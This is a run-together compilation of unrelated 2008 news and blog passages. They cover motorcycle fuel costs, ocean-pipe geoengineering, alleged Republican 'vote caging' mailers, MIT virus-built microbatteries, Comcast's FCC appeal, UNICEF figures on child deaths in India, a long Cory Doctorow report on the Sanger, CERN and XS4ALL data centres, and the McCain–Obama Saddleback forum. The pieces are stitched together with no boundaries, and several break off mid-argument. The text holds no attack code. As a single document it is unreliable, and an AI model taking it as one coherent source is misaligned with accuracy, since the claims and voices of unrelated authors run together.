That means that if you can get a motorcycle ( say a modest 600 cc bike , rather than a gas guzzling monster or a weakling 250 cc enduro ) for under $ 2000 , at $ 7 a gallon for fuel , it will pay for itself in one year on gas savings alone .
A couple years ago , when discussing the idea of getting a motorcycle for the fuel efficiency , it was always worth reminding oneself “ Wait a minute , it ’s not really saving any money .
A motorcycle is a big expense . ”
If you get a good deal on a used bike , though — and at the rate gas prices are climbing — you ’ll save money within a couple of years .
On one hand , I ’m happy that the reasons to avoid getting a motorcycle are evaporating .
I miss having a motorcycle ( though I hope my next bike is less of a deathtrap of unreliable mechanical uncertainty than the last ) .
On the other hand , these circumstances say some really absurd , ridiculous , depressing things about rising gas prices .
I mean , that seems pretty damned extreme .
Did I forget to carry a one , or something like that ?

Some scientists think ocean pipes could bring down carbon dioxide levels by stimulating upwelling .
HSW 2008
­ It seems like global warming gets worse by the minute as every day brings news of ice shelves melting , coral reefs dying and sea levels rising .
Meanwhile , the global population is at 6.7 billion and growing , and we continue to consume with abandon [ source : U.S. Census Bureau ] .
Despite environmentalists ' best efforts , it sometimes looks as though we 're not going to able to save ourselves fast enough from the looming catastrophe that is climate change .
But if we can't do it ourselves , can we get the Earth to do it for us ?

That 's the basic premise behind one of the latest ideas to lower atmospheric carbon dioxide .
Scientists suggest that by placing giant tubes in the oceans , we can encourage the natural process of upwelling , whereby cold , nutrient - rich water rises to the ocean surface and stimulates the growth of phytoplankton , or algae .
The algae in turn consume large amounts of carbon dioxide for photosynthesis , lowering atmospheric levels of the greenhouse gas .
Dimethyl sulfide produced in the process could also encourage the formation of clouds to reflect the sun 's rays .
The vertical tubes would n't require any outside energy input , and would instead rely on the natural energy of wave motion to force water up their 656 - foot ( 200 - meter ) length .
A flap or valve at the bottom of each tube would keep the flow of water one - way .
The idea is to place the tubes , which would probably be between 10 and 33 feet ( 3 and 10 meters ) wide , approximately 1.2 miles ( 2 kilometers ) apart and secure them using underwater tethers and surface buoys .
­ Initial estimates indicate that with 10 - foot ( 3 - meter ) waves , the 10 - foot diameter tubes could cool an entire 1.5 - square - mile ( 4 - square - km ) area that is 98 feet ( 30 meters ) deep by one half degree ( a 5 percent decrease in temperature ) in one month .
The uppermost ocean layer might see reductions of a few degrees more .
Furthermore , the nutrient - rich water would increase phytoplankton by more than 26,455 pounds ( 12,000 kg ) leading to a drawdown of 1,711 pounds ( 776 kg ) of carbon and a 265 - pound ( 120 - kg ) increase in the amount of fish [ source : Atmocean ] .
Beyond the effects on global temperature , the cooler ocean surface could also help to alleviate hurricane intensity .
Current models show that since hurricane winds draw much of their energy from warm ocean surface waters , the cooler waters created by the ocean pipes could lower those winds by up to 15 percent , resulting in a 40 percent decrease in storm damages .
One company 's storm track analysis lead it to hypothesize that if the tubes had been in place 10 years ago , they could have reduced the impact of 84 percent of the hurricanes that hit the U.S. [ source : Atmocean ] .
Right now , the ocean pipes are still in their initial testing phases , but the preliminary studies do show promise .
So why are some people far from convinced ?

Local Democratic Party Chair Seems Clueless About Republican Attempt to Disenfranchise His Voters ...
Brad Friedman Byon
9/18/2008 , 12:55 pm PT
From the St. Petersburg Times ...
TALLAHASSEE —
A new pitch for John McCain 's presidential campaign aimed at older Democratic voters is causing complaints by Democrats and concern by elections officials .
The piece , paid for by the Republican National Committee and authorized by McCain , tells voters it is seeking to double - check their " unconfirmed " party affiliations while asking for money .
A letter signed by McCain tells the Democrats : " We have you registered as a Republican . "
" I was a little bit shocked and a little bit surprised , " said recipient Bill Smith , 81 , of Tampa , who calls himself a lifelong Democrat and has been registered at his current address since 2000 .
...
The RNC declined to discuss the mailer , which Democrats said has landed in five counties : Duval , Hillsborough , Collier , Miami - Dade and Escambia .
The article goes on to note that FL's Republican SoS Kurt Browning believes the mailing is " confusing " and " unfortunate " , but does not note whether or not he plans to do anything about it .
We 're not holding our breath .
Neither are we holding it for Democrats down there to do much about it either .
The mailings sent to registered Democrats appear to be classic " caging " letters , marked as " Do Not Forward " , so that they will then be returned to the GOP if there is any problem with delivery .
Those returned letters will likely then be used as a basis to challenge the legitimacy of those particular voters on Election Day ....
The first - class GOP mailing has a " Do not forward " instruction on the envelope , meaning they will be returned to the GOP if a recipient has had mail forwarded , perhaps to a summer address , or has moved .
Letters returned as undeliverable can be compiled into " challenge lists " of unverifiable addresses and can be used to challenge voters ' eligibility during early voting or on Election Day .
The vote suppression technique is known as " vote caging . "
Aside from the troubling points spelled out above , and amplified by former Republican vote - rigger Allen Raymond last night on MSNBC ( Allen suggests this effort will be done everywhere by the GOP this year ) , there 's this disconcerting comment from the supposedly Democratic Party chair in Hillsborough County :
Hillsborough Democratic Party Chairman Michael Steinberg said it makes no sense for Republicans to question the party affiliations of Democratic voters .
" I do n't understand their logic , " he said .
You " do n't understand their logic , " Mr. Steinberg ?
What rock have you been living under ?
The same one Dems in the U.S. Congress have been living under , in regard to the practice of vote caging , perhaps ?
The same one that Bob Woodward and the Washington Post have been inexcusably living under ?
If so , Dahlia Lithwick 's Slate article from last year , explaining the practice , --- " What the heck is vote caging , and why should we care ? " --- filed after the issue finally reared its ugly head before a largely - clueless Democratic U.S. House Judiciary sub -committee , needs to be mandatory reading for every Democrat , and every member of the media .
Right now .
Suffice to say , Steinberg 's comment does not inspire confidence that Dems have any clue what they 're up against this year , as we noted in some detail on Monday .
MIT professor Paula T. Hammond and her fellow researchers have set her sights on tiny virus - based microbatteries about half the size of a human cell .
When we first focused our sights on her research at MIT , Professor Paula T. Hammond was making headway on a new thin film fuel cell material soon to succeed Nafion .
This time the renowned Bayer Professor of Chemical Engineering , along with the ceramics specialist Professor Yet - Ming Chiang , Angela M. Belcher , and other scientists affiliated with the MIT Energy Initiative , is working on a new energy storage solution , one that could harness the power of tiny virus - based microbatteries about half the size of a human cell .
Convinced that this technology can one day power a myriad of miniature electronics , Hammond and her colleagues have even worked out a way to instantly forge and install these nano - devices .
Their application , she believes , will range from labs - on - a- chip to implantable medical sensors .
Batteries consist of two opposite electrodes -- an anode and cathode -- separated by an electrolyte .
Using a common technique called soft lithography as well as the self - assembling virus cultivation , the MIT team created both the anode and the electrolyte .
" The resulting electrode arrays exhibit full electrochemical functionality , " they concluded in their Proceedings of the National Academy of Sciences ( PNAS ) paper on August 18 .
" To our knowledge , this is the first instance in which microcontact printing has been used to fabricate and position microbattery electrodes and the first use of virus - based assembly in such a process . "

Ever since the FCC handed down its 3 - 2 decision against cable operator Comcast 's network management techniques , Comcast has been expected to sue the FCC .
Today , the cable giant made good on those predictions , filing an appeal of the FCC ruling in the DC Court of Appeals , which has jurisdiction over FCC decisions .
The appeal itself is brief : a two - page document , a cover letter , and a $ 450 check .
But the fight that it spawns will no doubt drag on for quite some time , centering on one major question : can the FCC rule against Comcast based on a policy statement that the FCC said was not enforceable at the time ?
In a statement today , however , Comcast did admit that the FCC does have the authority to regulate ISPs " in appropriate circumstances and in accordance with appropriate procedures . "
As the legal process plays itself out , Comcast has pledged to abide by the order and continue its work to move towards a protocol - agnostic throttling system that could slow " heavy users " down to DSL levels for 20 minutes at a time ( another piece of the bandwidth management puzzle , hard bandwidth caps , were also announced last month ) .
" Although we are seeking review and reversal of the Commission 's network management order in federal court , we intend to comply fully with the requirements established in that order , which essentially codify the voluntary commitments that we have already announced , and to continue to act in accord with the Commission ’s Internet Policy Statement , " said David Cohen , Comcast 's executive vice president .
" Thus , we intend to make the required filings and disclosures , and we will follow through on our longstanding commitment to transition to protocol - agnostic network congestion management practices by the end of this year . "
With Comcast pledging to abide by the FCC 's decision , what 's the point of the lawsuit ?
The FCC 's finding and order are precedent setting , in that the Commission has rendered a decision on how far ISPs can go in managing their networks for the first time .
That 's a precedent Comcast and its cable and telecom brethren would rather not have , as they would prefer to manage their networks in any manner they see fit without directives from the FCC covering what kinds of management techniques are over the line .

NEW DELHI ( Reuters ) - India is failing to provide basic healthcare to its poorest children despite robust economic growth , underlining a widening gap between rich and poor across the Asia - Pacific region , the United Nations said on Tuesday .
The United Nations Children ’s Fund ( UNICEF ) said cutting child mortality depended on India and China , which together accounted for almost a third of all child deaths worldwide in 2006 .
India is among 13 countries in the Asia - Pacific which are struggling to reduce child mortality rates by two thirds , one of the so - called health - related Millennium Goals the United Nations set to achieve by 2015 , UNICEF said in a new report .
“ India needs more political will and needs to strengthen its healthcare delivery to the poorest of the poor who are not being reached , ” Daniel Toole , UNICEF ’s regional director of South Asia , said in New Delhi .
In 2006 , 2.1 million children under five years old died in India -- the biggest number after China .
India is the second most populous nation in the world and UNICEF said global efforts to improve child survival would fail unless it does better .
“ India is a key to the process of improvement and if India fails , the world fails , ” Toole said after releasing “ The State of Asia Pacific ’s Children 2008 ” report .
India ’s infant mortality rate stood at 57 per 1,000 live births last year .
The country ’s health officials have announced they would bring that rate down to around 30 per 1,000 live births within the next four years .
South Asia was also falling behind rest of the world with only 1.1 percent of gross domestic product allocated to health care , UNICEF said .
Experts say many of the two - thirds of Indians living in rural areas do not have access to basic medical facilities , despite the country achieving 9 percent economic growth .
Around 65 percent of Indian women still give birth at home .
UNICEF says there is an urgent need for drugs , doctors , nutrition and education for poor women and children .
“ There is a tremendous level of growth , but the actual disparity between the rich and the poor is increasing , ” Toole said .
One out of every three women in India is also underweight , putting them at risk of delivering low birth - weight babies .
These babies are 20 times more likely to die in infancy , according to UNICEF .
Healthcare facilities in India and the Asia - Pacific region was also hampered by corruption , Toole said .

What does it take to store bytes by the tens of thousands of trillions ?
Cory Doctorow meets the people and machines for which it 's all in a day 's work .
The data centre at the Wellcome Trust Sanger Institute in Cambridge , UK , under development .
S. NORFOLK
Ten seconds after I stepped into the roar of the data centre at the UK Wellcome Trust Sanger Institute , in rural Cambridgeshire , my video camera croaked : CARD FULL .
Impossible .
That morning , I 'd tossed a handful of thumbnail - sized 32 - GB memory cards into my pocket , each one good for a couple of hours ' worth of high - definition video .
Yet this one had filled up in seconds .
I fumbled with my camera while Phil Butcher , the Sanger Institute 's head of information technology ( IT ) , politely waited , grinning in the shower of cold air washing down from the air conditioning .
It took only a couple of embarrassing seconds to troubleshoot : I 'd somehow mixed an old 32 - megabyte card in with the 32 - gigabyte cards .
The 32 - MB card is only a couple of years old ; when I bought it , it probably cost more than the 32 - GB cards do today .
But it holds one one - thousandth of the data .
That , in coincidental microcosm , is the story I 'm here for : the relentless march from kilo to mega to giga to tera to peta to exa to zetta to yotta .
The mad , inconceivable growth of computer performance and data storage is changing science , knowledge , surveillance , freedom , literacy , the arts — everything that can be represented as data , or built on those representations .
And in doing so it is putting endless strain on the people and machines that store the exponentially growing wealth of data involved .
I 've set out to see how the system administrators , or sysadmins , at some of the biggest scientific data centres take that strain — and to get a sense of how it feels to work with some of the biggest , coolest IT toys on the planet .
At this scale , memory has costs .
It costs money — 168 million Swiss francs ( US $ 150 million ) for data management at the new Large Hadron Collider ( LHC ) at CERN , the European particle - physics lab near Geneva .
And it also has costs that are more physical .
Every watt that you put into retrieving data and calculating with them comes out in heat , whether it be on a desktop or in a data centre ; in the United States , the energy used by computers has more than doubled since 2000 .
Once you 're conducting petacalculations on petabytes , you 're into petaheat territory .
Two floors of the Sanger data centre are devoted to cooling .
The top one houses the current cooling system .
The one below sits waiting for the day that the centre needs to double its cooling capacity .
Both are sheathed in dramatic blue glass ; the scientists call the building the Ice Cube .
Blank slate
The fallow cooling floor is matched in the compute centre below ( these people all use ' compute ' as an adjective ) .
When Butcher was tasked with building the Sanger 's data farm he decided to implement a sort of crop rotation .
A quarter of the data centre — 250 square metres — is empty , waiting for the day when the centre needs to upgrade to an entirely new generation of machines .
When that day comes , Butcher and his team will set up in that empty space the yet - to - be - specified systems for power , cooling and the rest of it .
Once the new centre is up , they 'll be able to shift operations from the obsolete old centre in sections , dismantling and rebuilding without a service interruption , leaving a new patch of the floor fallow — in anticipation of doing it all again in a distressingly short space of time .
The first rotation may come soon .
Sequencing at the Sanger , and elsewhere , is getting faster at a dizzying pace — a pace made possible by the data storage facilities that are inflating to ever greater sizes .
Take the human genome : the fact that there is now a reference genome sitting in digital storage brings a new generation of sequencing hardware into its own .
The crib that the reference genome provides makes the task of adding together the tens of millions of short samples those machines produce a tractable one .
It is what makes the 1000 Genomes Project , which the Sanger is undertaking in concert with the Beijing Genomics Institute in China and the US National Human Genome Research Institute , possible — and with it the project 's extraordinary aim of identifying every gene - variant present in at least 1 % of Earth 's population .

As data pour off the Sanger 's new Solexa sequencers , Butcher — a trim , bantam grey - haired engineer with twinkling eyes and laugh - lines — has to see to it that they have somewhere to go .
A two - hour Solexa run produces a gigantic amount of information : 320 TB , according to Tony Cox , head of sequencing informatics , a figure he 's mentioned to journalists in the past ( a print - out on his office door reads : " ' Oh shit , that 's 320 TB ! ' — Tony Cox , The Guardian , 28 February 2008 " ) .
The 1000 Genome Project needs to make use of storage and computing capacity at a ( currently ) impossible density .
Luckily for Butcher , ' impossible ' is a time - bound notion — if you do n't like the compute reality , just wait around a little while and another will be along shortly .
His storage density is doubling every year ; the 500 - GB hard - drives spinning away in his storage array are being phased out by Seagate of Scotts Valley , California , the company that makes them , in favour of a terabyte model .
The XS4ALL building in Amsterdam .
C. DOCTOROW
Finding a place for the data to go is only the beginning .
Butcher also has to make sure they can get back out .
The Sanger has a commitment to serving as an open - computing facility for the worldwide research community .
So it faces what you could call the Google problem : an unpredictable and capricious world that might decide at any moment to swarm in with demands for shedloads of arbitrary - seeming data .
Just as a news scandal can conjure a flashmob of millions of net -users to Google 's homepage , all searching for ' tsunami ' or ' paris hilton ' , an exciting discovery in genetics sends the whole bioinformatics community to the Sanger 's servers , all demanding the same thing .
You can't go far in this world without some sort of comparison to Google , which is the biggest of the big gorillas .
How big , though , is not quite clear — and nor is it clear how it manages its flashmobs and other petaproblems .
In the ten years since the company 's founding , Google 's data - serving systems have gone from a set of commodity PCs connected to a hard - disk array built into an enclosure made from Lego bricks to a global system of data farms unmatched by anyone else .
Each of those data centres is designed from the foundation up to operate as a single big computer .
Google buys components optimized for the kind of operations that relentlessly hammer its servers .
It has software for the job such as Google File System ( which distributes three copies of each piece of information in a way that makes it easy to recover when the inevitable failure occurs ) and Google MapReduce , a system for automatically and efficiently making large data sets amenable to parallel processing .
Google 's distinguished engineers present papers at learned conferences explaining in detail how it all works .
People such as Butcher pay close attention .
But then there 's the closed part : all the specific metrics and data - porn that Google considers of competitive significance .
The company no longer says how big the model , or copy , of the web 's material spread through its data centres is .
It does n't disclose the dimensions or capacity of those data centres .
Nature wanted me to visit one for this piece , but a highly placed Googler told me that no one from the press had ever been admitted to a Google data centre ; it would require a decision taken at the board level .
Which is too bad .
But it 's not as if the world is bereft of other computer installations with mind - bending requirements .
And at CERN , the Sanger and XS4ALL in the Netherlands , I found myself welcomed into the roaring sanctums of computing , escorted around by sysadmins eager to show off the hellaciously complex , monstrously powerful machines that they 've been able to put together and put to use .
Repository of all knowledge
The primary XS4ALL facility at the World Trade Centre near Schiphol Airport in Amsterdam was actually built to house a mighty array of huge telephone switches in 2000 .
KPN , the then Dutch national telecom company , fitted it out generously , with several months ' worth of diesel in subterranean tanks for its uninterruptible power supply 's back - up generators , and two independent cooling systems , with one raised two storeys off the ground to flood - proof it ( this is the lowlands after all ) .
But telecom deregulation was not kind to KPN , and the switches never came .
So now the facility houses XS4ALL , a once - notorious Dutch Internet service provider that has somehow made it bigtime .
Hacktic , a collective of hackers , established XS4ALL in 1993 to help cover the costs of the Internet link they had set up .
In 1994 , KPN shut down all of XS4ALL 's lines after the collective published an article explaining how to cheat the phone company 's punitive long - distance tolls — the ISP came back online only after posting a 60,000 guilder ( US $ 35,000 ) cash bond .
Just four years later , after XS4ALL had grown into one of the most successful ISPs in the lowlands , the state company bought out its former gadfly .
Today XS4ALL is as independent as a subsidiary of a former government monopoly can be , but its members are not above sharing digs with their corporate parent , especially as the corporate parent is such a spendy sort of sugar - daddy .
XS4ALL has taken over two storeys of the would - be switching centre with hackerish humour : the raised floors sport Perspex panels revealing neon lights and jumbles of entombed PC junk ; there is a chill - out room for sysadmins who come on - site to run backups or swap drives ; a poster listing the facility 's regulations ends : " Rule 12 : No sex in the data centre . "

The mix of freewheeling hacker humour , deadly serious commitment to free speech and solid technological infrastructure made XS4ALL a natural choice to host a mirror copy of the Internet Archive ( www.archive.org), a massive ' repository of all knowledge ' .
The archive 's best - known feature is the Wayback Machine , an archive of most of the public pages on the World Wide Web that allows visitors to ' travel in time ' and see what any given URL looked like on any given date since 1996 .
But it also serves as a repository for practically every public domain and Creative Commons - licensed digital document it can lay its hands on .
It is the brainchild of philanthropist Brewster Kahle — co-creator of Wide Area Information Servers , or WAIS , one of the first Internet search engines — who wants it to provide " universal access to all knowledge " .
In a world of here today / gone tomorrow Web 2.0 companies willing to host your video , pictures or text , the archive stands out as a sober - sided grown - up with a commitment to long - term ( infinite - term ) hosting .
Inside the XS4ALL data centre , which is about the size of a football pitch , my hosts took me past aisle after aisle of roaring machines to the Internet Archive 's European mirror .
" That 's it , huh ? "
Two racks , each the size of a modest refrigerator , each holding north of a petabyte 's worth of information .
These are the PetaBoxes , the Internet Archive 's web - in - a - box systems .
Designed as a shippable backup for every freely shareable file anyone cares to upload and hundreds of copies of everything else , too , they betray the archive 's US origins in the strip of American - style electric outlets running down one strut , a column of surprised clown - faces Fed - Exed from across the ocean .
A couple of other things set them apart .
Each rack draws 12 kilowatts , whereas a normal rack at the facility draws 4.5 kilowatts ; the drive - housings are covered in a rather handsome fire - engine - red enamel .
Apart from that , the PetaBoxes are just another pair of racks .
“ The PetaBoxes have the elegant , explosive compactness of plutonium . ”
Yet housed in these machines are hundreds of copies of the web — every splenetic message - board thrash ; every dry e-government document ; every scientific paper ; every pornographic ramble ; every libel ; every copyright infringement ; every chunk of source code ( for sufficiently large values of ' every ' , of course ) .
They have the elegant , explosive compactness of plutonium .
Something dawns on me : I ask my XS4ALL tour guides , shouting over the jet - engine roar : " If there are all those copies of the web on the PetaBoxes , what 's in all the other machines ? "
" Oh , customer stuff .
Intranets .
Databases .
E-mail .
Usenet . "
In other words , all the dynamic stuff , the private stuff , the dark web that is invisible to search engines , and all the processor power needed to serve it .
All the reasons that Google can't exist just in a couple of red PetaBoxes .
" How does KPN feel about housing these two extraordinary boxes ? "
" Oh , " they say , exchanging a mischievous glance , " I do n't think they know we have them here . "
In a data centre such as this , a working approximation of ' all knowledge ' can be slipped into the cracks like a 32 - MB memory card jingling in my pocket .
600 million collisions a second
The archive has three real - time mirrors : the original in San Francisco 's Presidio , just south of the Golden Gate , the XS4ALL mirror , and a third under the New Library of Alexandria in Egypt .
A keen observer will note that these are variously placed on the San Andreas Fault , in a flood - zone , and in a country with a 27 - years - and - running official ' state of emergency ' that gives the government the power to arbitrarily restrict speech and publication .
Someone needs to buy Kahle a giant cave in Switzerland .
Like the one I 'm off to now , which will be housing the data from the biggest experiments on the most powerful machine ever conceived .

Except it turns out that the data centre at CERN is less hall of the mountain king and more high - school gymnasium .
The caverns measureless to man through which the LHC runs are reserved for making the data .
The systems storing them have much more humdrum quarters .
The slight sense of anticlimax is emphasized by the unflappable calm of Tony Cass , CERN 's leader of fabric infrastructure and operations ; his data centre may be about to become the white - hot focus of the entire world 's high - energy physics community , but Cass is surprisingly and perhaps bit disappointingly relaxed .
Indeed , when we met just a few weeks before the LHC was about to see its first circulating beam , on 10 September , he was headed off on holiday .
Built in the 1970s to be the only data centre that CERN would ever need , Cass 's current facility is now just a stopgap on the way to the construction of a bigger , faster centre that will absorb 15 petabytes a year of experimental data from the LHC .
Although the rack after rack of systems in the current centre are nearly new , there are already plans to replace them .
The basement is a graveyard of already - replaced generic PCs that are slowly being cleansed of data and shipped to bidders from the former Soviet Union .
A PetaBox .
C. DOCTOROW
The difference between Cass 's challenges and Butcher 's is a difference in the way that physics and biology work .
At the Sanger , the charge - coupled devices ( CCDs ) in the sequencers can vomit out TIFF image files by the terabyte around the clock , but they are useless until processed , analysed and shrunk down to a far more manageable summary of what those vast image files actually meant .
The original data are thrown away — the Sanger is confident that there will never be anything new to be learned from looking at the raw image files later .
And there would be no way of keeping it except on tape , and tape , as Butcher will tell you , is slow , impractical and failure prone .
As a former sysadmin myself , I can attest to the inherent tetchiness of tape .
The Sanger reduces the images to more amenable data and then sends everything off to various mirror sites using a custom - made file - transfer protocol implemented over what 's known as user datagram protocol ( UDP ) ; this allows the gene genies to saturate entire transoceanic links without having to wait for any of the finicky TCP handshaking and error - correction nonsense used for Internet traffic .
It 's slow compared with CERN 's approach — CERN leases its own fibre , at great expense — but it certainly beats the old - school open - source system used to glue together the Internet Archive 's mirrors .
If only high - energy physics were so amenable to throwing stuff away , Cass 's life would be a lot simpler .
It 's not .
The meaning of a sequencer run is pretty straightforward , and wo n't change .
The meaning of a particle collision is continuously reassessed based on new information about the instrument 's performance .
Physicists will want to reanalyse all the collisions expected from the LHC from the first to the last .
Six hundred million events a second for year after year , analysed over and over again as the physicists ' models become more refined .
And that means a lot of storage — the kind of storage you can't load onto a reasonable quantity of spinning drives .
The kind of storage you need to put on tape .
I am , admittedly , prone to swooning over a well - designed bit of IT kit , but I have never developed as deep and meaningful and instantaneous a relationship as the one I formed with the two tape - loading robots in the basement of the CERN data centres .
A tape robot at CERN ( top ) and cooling devices at XS4ALL .
C. DOCTOROW
The Vader - black machines , one built by StorageTek , a subsidiary of Sun Microsystems , the other by IBM , are housed in square , meshed - in casings the size of small shipping containers .
From within them comes a continuous clacking noise like the rattling of steel polyhedral dice on a giant 's Dungeons & Dragons table .
I pressed my face against the mesh and peered in fascination at the robot arms zipping back and forth with tiny , precise movements , loading and unloading 500 - GB tapes with the serene grace of Shaolin monks .
Did I say tape is tetchy ?
I take it back .
Tape is beautiful .
Each robot - librarian tends 5 PB of data .
It will jump shortly to 10 PB each when the 500 - GB tapes are switched to 1 - TB models — an upgrade that will take a year of continuous load / read / load / write / discard operations , running in the interstices between the data centre 's higher - priority tasks .
When that is done , there should be 2 - TB tapes to migrate to , bringing the two robots ' total up to 40 PB .
At least , that 's what CERN hopes .
The tape libraries will allow the regular reassessment of the LHC data — unloading , reprocessing and reloading all the data on each of the tapes .
A complete reprocessing will take a year , in part because , although it is higher priority than migrating the data to higher - density tapes , it still takes a backseat to the actual science — to jobs requested from anywhere in the world .
CERN embodies borderlessness .
The Swiss–French border is a drainage ditch running to one side of the cafeteria ; it was shifted a few metres to allow that excellent establishment to trade the finicky French health codes for the more laissez - fair Swiss jurisdiction .
And in the data sphere it is utterly global .
Cass 's operation is backstopped by ten ' Tier One ' facilities around the world that replicate its tape library , and some hundreds of ' Tier Two ' facilities that provide compute - power to operate on those data , all linked by dedicated , high - speed fibre , part of a global network that attempts to tie the world 's high - energy physics institutions into a single , borderless facility .
A researcher who logs into the CERN data centre runs code without worrying which processors execute it or which copy of the data it is run on .
The birthplace of the web , which demolished borders for civilians , CERN is ushering in a borderless era for data - intensive science , an era in which US researchers run code on Iranian supercomputers and vice versa , without regard for their respective governments ' sabre rattling .
Cass wants to weld the world 's physics computers into a single machine .
Sysadmin nightmares
“ If the emergency system did n't come on the temperature would hit 42 °C in ten minutes . ”
At each data centre I asked the sysadmins for their worst fears .
Universally , the answer was heat .
Data centres are laid out in alternating cool and hot aisles , the cool looking at the front of the racks , the hot at the back .
At CERN , they actually glass over the cool aisles to lower the cooling requirements , turning them into thrumming walk - in fridges lined with millions of tiny , twinkling lights .
If power is cut to the cooling system in one of these places , you 've got minutes for a clean shutdown of the systems before their heat goes critical .
XS4ALL has a particularly impressive cooling system , a loop that runs from the 5 °C , 30 - metre depths of nearby Lake Nieuwe Meer , warms to 16 °C in the centre 's exchangers , and then plunges back to the lake - bottom to be cooled again .
The site manager Aryan Piets estimates that if it broke down and the emergency system did n't come on , the temperature in the centre would hit 42 °C in ten minutes .
No one could cleanly bring down all those machines in that time , and the dirtier the shutdown , the longer the subsequent start - up , with its rebuilding of databases and replacement of crashed components .
Blow the shutdown and stuff starts to melt — or burn .

Data centres do face more exotic risks .
Google once lost its transoceanic connectivity because of shark bites .
Butcher lives in fear of a Second World War fighter plane going astray from the airshows at nearby Duxford airfield and crashing into the Ice Box .
At CERN they worry about people believing the worries that the Universe will wink out of existence when they fire up the LHC .
But the real worry is power and its management .
Data centres built in the giddy dotcom heyday assumed that racks would sport one processor core per unit and planned cooling and energy accordingly .
But that is not the way the technology has gone .
Computers have got faster not through faster cores , but through more of them .
With 16 cores or more per unit , data centres around the world sit half - empty , unable to manage the power - appetites of a whole room 's worth of 2008 's ultra - dense computing .
And everyone lives in fear of the electrical fault that sparks a blaze that wafts killing soot into the hungry ventilation intakes on the racks .
A big part of the problem — and possibly of its solution — is that most of a data centre 's compute capacity is idle much of the time .
No sysadmin would provision a data centre to run at capacity around the clock , lest it melt down ( along with the sysadmin 's career ) the first time something really juicy increased the load .
Yet whether a network card is saturated or idle , it still burns 100 % of its energy draw .
The same with video cards , power supplies , RAM and every other component except for some CPUs .
So these idle systems whir away , turning coal into electricity into heat that has to be cooled with coal turned into electricity turned into heat , and the planet warms and the bills soar .
Every decibel of noise roaring through the centres is waste , energy pissed away for no benefit .
The people with the biggest data centres have the biggest problem — and the biggest resource to throw at it .
Google buys its systems in enough bulk that it can lay down the law to component suppliers , demanding parts that draw power proportional to the amount of work that they are doing .
Its holistic approach to the data centres , treating each one as a single PC , means that it can plan for idleness and peak load alike , and keep the energy bills under control .
Everyone agrees that something like this is the way forward , that the future of data centres must be cooler , and quieter .
That said , a certain discomforting noise has its advantages .
" I do n't want it to ever get too comfortable in here , " says Cass .
" I like it that people access us remotely .
It just does n't scale , having every scientist drop in to run jobs here in the centre . "

And if Google leads the way because it has to feed people 's need for Paris Hilton searches and peeks at their own roof on Google Earth , that is quite fitting .
Whereas scientists unzip new genomes and summon new particles from the roiling vacuum with technologies beyond compare , the secret of data storage and processing is a lot simpler : commodity components .
There is a huge ingenuity in how you use them , cool them , arrange them and keep them from melting , but the basic ingredients of a petacentre are the ingredients of life on the net .
Everything I 've seen on these trips was basically made out of the same stuff I 've got lying around the flat .
Gene - sequencers use multi-megapixel CCDs — cheap and cheerful in this era of digital photography — to generate TIFFs that I could open with the open - source image - manipulation program that came with my free Ubuntu GNU / Linux operating system .
The hard - drives in the server cases are the same cheap , high - capacity Seagates and Toshibas that I have in the little box I stuck under the stairs and wired up to my telly to store away a couple of terabytes of video , audio and games .
A decade ago , a firm's ' mainframe ' was a powerful beast made from specialized components never seen outside the cool , dust - free environs of the data centre .
Today , mainframe is more synonymous with the creaky old legacy system that no one can be bothered to shut down because it is running an obscure piece of accounting software that would be a pain to port to a modern system .
The need for special hardware just is n't there any more .
Even Google 's ' energy - proportional ' future is just an expansion of the power - management and heat - dissipation technology developed for laptops , and any gains achieved on the server side will also come to our desktops .
I 've got everything I need lying around the office to make my own petacentre — I just need more of it .
And a much bigger fridge .
Or a cool - bottomed lake .
That said , I do n't have a tape robot .
But I really , really want one .

Early today --- the McCain campaign made a baseless accusation about Obama 's camp .
That Barack was playing the race card .
No , really .
They should know all about race after they released an attack ad with two young , white women in it ( Paris Hilton ) to contrast Obama and make him look like ?
You get the picture .
John McCain told CNN's John King in a very somber tone , that yes --- they played it .

King :... is it a fair criticism for Rick Davis to say --- the Obama campaign is playing the race card ?
McCain :
It is , I 'm sorry to say that it is .
It 's legitimate and we do n't , there 's no place in this campaign for that .
There 's no place for it and we should n't be doing it .
King :
They say that 's not the case .
McCain : OK John , I 'll let the American people judge .
The presidential candidates were on stage together for just a moment , but John McCain and Barack Obama offered an arresting contrast Saturday night both stylistically and on sensitive issues , most sharply on abortion .
In the two - hour forum at Orange County ’s Saddleback Church , Obama told Pastor Rick Warren that it was “ above my pay grade ” to define when a baby gets human rights , while McCain quickly answered , “ At the moment of conception . ”
The Republican candidate had the easier task in the back - to - back interviews before about 2,800 members of the evangelical church in Lake Forest .
He drew frequent applause with crisp answers intended to reinforce his conservative credentials .
Obama offered more nuanced and analytical answers on some issues important to conservative voters : abortion , same - sex marriage and stem - cell research .

But Obama , a Christian who until recently attended Trinity United Church of Christ in Chicago , was more revealing about his faith .
Explaining what it meant to him to be a Christian , the Democrat talked of “ walking humbly with our God . ”
“ I know that I do n’t walk alone , and I know that if I can get myself out of the way that I can maybe carry out in some small way what he intends , ” he said .
He used a line from the New Testament to answer Warren ’s question about what had been America ’s greatest moral failure .
“ We still do n’t abide by that basic precept of Matthew that whatever you do for the least of my brothers , you do for me , ” Obama replied .
Asked about his own moral failure , the Illinois senator cited his use of drugs and alcohol as a young man :
“ When I find myself taking the wrong step , I find that a lot of the time it is because I am trying to protect myself and not do God ’s work . ”

McCain , an Episcopalian who attends a Baptist church in Phoenix , has frequently been criticized by evangelical leaders for failing to speak as openly about his faith as Obama and for relying on well - worn stories about how he found God as a prisoner of war in Vietnam .
He did not diverge from that practice Saturday night .
Asked what it meant to be a Christian , McCain said : “ It means I ’m saved and forgiven . ”
He quickly moved on to a story about a prison guard who approached him and secretly drew a cross in the sand .
“ For a minute there -- there was just two Christians worshiping together .
I ’ll never forget that moment , ” McCain said .
Without elaboration , he said that his greatest moral failure was his first marriage .

The candidates met briefly between interviews .
Obama greeted McCain with a handshake and hug .
They did strike some common themes , such as the importance of rising above self - interest to serve one ’s country .
But they also offered starkly different answers to Warren ’s question : “ At what point does a baby get human rights ? ”
Obama said : “ I think that whether you are looking at it from a theological perspective or a scientific perspective , answering that question with specificity , you know , is above my pay grade . ”
He added that he supports the landmark decision Roe vs .
Wade but said the issue has “ moral and ethical content ” and stressed his commitment to reducing the number of abortions .
McCain , however , immediately responded that a baby ’s rights begin at conception .
Perhaps seeking to tamp down alarm among conservatives over his recent comment that he ’s open to a running mate who favors abortion rights , he continued : “ I will be a pro-life president , and this presidency will have pro-life policies . ”

After sustained applause , Warren quipped : “ OK , we do n’t have to go longer on that one . ”
